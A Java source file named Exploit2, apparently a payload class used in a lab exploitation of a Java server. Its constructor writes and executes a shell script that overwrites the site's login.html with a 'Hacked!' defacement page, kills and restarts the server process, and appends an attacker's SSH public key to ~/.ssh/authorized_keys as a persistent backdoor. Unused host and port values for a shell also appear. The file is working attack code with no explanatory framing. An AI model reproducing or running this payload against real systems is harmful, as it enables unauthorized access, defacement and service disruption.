import java.io.*;

public class Exploit2 {
    public Exploit2() throws Exception {
        String host = "192.168.195.129";
        int port = 9001;
        String cmd = "/bin/sh";
        String publicKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDX/ivDLOFoe/m8Hphtg9911umP3jof4EON9oHumbNFtxB6J7fGkub7FY86O/JFumLotogKtLtFly9jlgOWP7EOUKip0lHHli13yoEg+uZ3D/dm9k1NhX1bQjHNOym6WDphuEGwpt+jaD7a2+p2Dhdss3R3coUGviLjjkIoozFoGfHtDlrKnEDGNrOMRUDYXddnVFzTb0oWRKyfxGt1CLOW8RclhaerRWJBdwGupYUhJ13aqe4vZi2J+iCWSdi6/PmxQTygHVPs61+okZGcWMN/SR4M/ApfrPElourI98sywdbgc3UL17kLCNocSs925CJMQHLtR0i2LsO9WIel5+K0XoirRRAOi1PhdLcNonJOt/zzaRKa1IdMCmg9qkCUXPF7imxO3d7Xw0CWd9LRFRq1zLrEvMyWsST+Bb9Mc9WDsG9rD4EvzIqzVDiubL4ykxpi/WRkq5VzmRyOljIWFsPmycGSmAFeDMXpqnfbsoCa1PMTeByD/qhsY+S35Mh3X9M= root@osboxes";
        String script =
                "#!/bin/bash\n" +
                        "current_directory=$(pwd)\n" +
                        "echo \"<!DOCTYPE html>\n" +
                        "<html lang=\\\"en\\\">\n" +
                        "<head>\n" +
                        "    <title>Hacked</title>\n" +
                        "</head>\n" +
                        "<body>\n" +
                        "    <h2>Hacked!</h2>\n" +
                        "</body>\n" +
                        "</html>\" > \"${current_directory}/src/main/java/main/java/login.html\"\n\n" +
                        "echo '#!/bin/bash\n" +
                        "PROCESS_ID=$(ps -ef | grep \"main.java.Server\" | grep -v grep | awk '\"'\"'{print $2}'\"'\"')\n\n" +
                        "if [ ! -z \"$PROCESS_ID\" ]; then\n" +
                        "    kill $PROCESS_ID\n" +
                        "    wait $PROCESS_ID 2>/dev/null\n" +
                        "fi\n" +
                        "./mvnw exec:java -Dexec.mainClass=main.java.Server' > reload.sh\n\n" +
                        "chmod 777 reload.sh\n" +
                        "./reload.sh\n\n" +
                        "echo \"" + publicKey + "\" >> ~/.ssh/authorized_keys\n" +
                        "chmod 700 ~/.ssh\n" +
                        "chmod 600 ~/.ssh/authorized_keys\n";

        // Write the script to a temporary file
        File scriptFile = File.createTempFile("script", ".sh");
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(scriptFile))) {
            writer.write(script);
        }

        // Make the script executable
        ProcessBuilder chmodProcessBuilder = new ProcessBuilder("chmod", "777", scriptFile.getAbsolutePath());
        chmodProcessBuilder.redirectErrorStream(true);
        Process chmodProcess = chmodProcessBuilder.start();
        chmodProcess.waitFor();

        // Execute the script
        ProcessBuilder pb = new ProcessBuilder(cmd, "-c", scriptFile.getAbsolutePath());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        p.waitFor();
        p.destroy();

    }

    public static void main(String[] args) {
        try {
            new Exploit2();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
